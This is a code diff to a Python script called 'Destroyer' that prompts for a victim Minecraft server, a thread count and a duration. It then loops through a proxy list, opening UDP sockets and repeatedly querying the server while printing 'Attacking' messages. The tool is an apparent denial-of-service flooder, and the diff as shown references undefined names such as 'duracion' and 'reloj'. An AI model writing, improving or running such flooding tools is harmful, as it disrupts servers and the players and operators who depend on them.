@@ -17,16 +17,14 @@ from colorama import *
 os.system("clear")
 
 def main():
-    global ip
-    global port
+    global victima
     global tiempo
     global lista
     global s
-    ip = sys.argv[1]
-    port = int(sys.argv[2])
-    tiempo = int(sys.argv[3])
+    tiempo = int(input("[Destroyer] Tiempo (Segundos): "))
     lista = 'proxy.txt'
     thr = input("[Destroyer] Threads: ")
+    victima = input("[Destroyer] Victima: ")
     pprr = open(lista).readlines()
     atk()
 
@@ -37,15 +35,15 @@ def atk():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         pprr = open(lista).readlines()
-        server = MinecraftServer.lookup(input("[Destroyer] Victima?: "))
+        server = MinecraftServer.lookup(victima)
         status = server.status()
         if reloj()<duracion:
             proxy = random.choice(pprr).split(":")
             s.connect((str(proxy[0]), int(proxy[1])))
-            print("{}".format(status.description))
-            print(Fore.CYAN + " " + Fore.WHITE + str(proxy[0]) + ":" + str(proxy[1]))
+            print("[Destroyer] Attacking " + str(victima) + " // Pinging from - " + str(proxy[0]) + ":" + str(proxy[1]))
         else:
             exit()
 
 
 main()
+
